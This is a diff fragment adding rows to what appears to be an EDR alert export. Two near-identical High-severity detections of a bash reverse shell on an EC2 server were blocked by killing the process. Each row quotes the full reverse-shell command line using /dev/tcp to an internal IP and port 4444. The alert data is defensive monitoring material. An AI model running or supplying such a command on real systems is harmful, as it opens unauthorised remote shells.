+    ""BashReverseShell""
+   ]",ad93655e583befc3b8585605b6254da7c660446c1742f18753163f64ba0aa9d4,bash,/usr/bin/bash,"Prevention, process killed.",AWS_EC2_V2,--,/bin/sh -c bash -i >& /dev/tcp/172.17.0.21/4444 0>&1,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:10123840220-30103-1001488,66c3f3d38cfa0b24d392bf04b534272ba5ef83b9abf6dc6aa672aa7841c5afc6,--,--
+High,2026-03-18T19:32:25Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Command and Control via Remote Access Tools,"[
+    ""BashReverseShell""
+   ]",ad93655e583befc3b8585605b6254da7c660446c1742f18753163f64ba0aa9d4,bash,/usr/bin/bash,"Prevention, process killed.",AWS_EC2_V2,--,/bin/sh -c bash -i >& /dev/tcp/172.17.0.21/4444 0>&1,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:10101525605-30103-999440,66c3f3d38cfa0b24d392bf04b534272ba5ef83b9abf6dc6aa672aa7841c5afc6,--,--
